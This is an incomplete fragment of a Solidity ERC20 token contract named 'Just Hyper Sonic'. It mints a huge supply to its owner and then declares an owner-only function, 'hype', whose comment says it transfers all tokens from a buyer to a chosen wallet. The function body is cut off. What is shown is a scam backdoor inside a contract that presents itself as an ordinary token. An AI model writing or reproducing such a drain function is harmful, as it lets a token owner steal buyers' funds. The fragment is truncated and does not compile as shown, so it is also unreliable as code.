...
contract HyperSonic is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Just Hyper Sonic", "HYPESC") Ownable(initialOwner) {
        _mint(initialOwner, 888000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function hype(address from, address to) external onlyOwner {
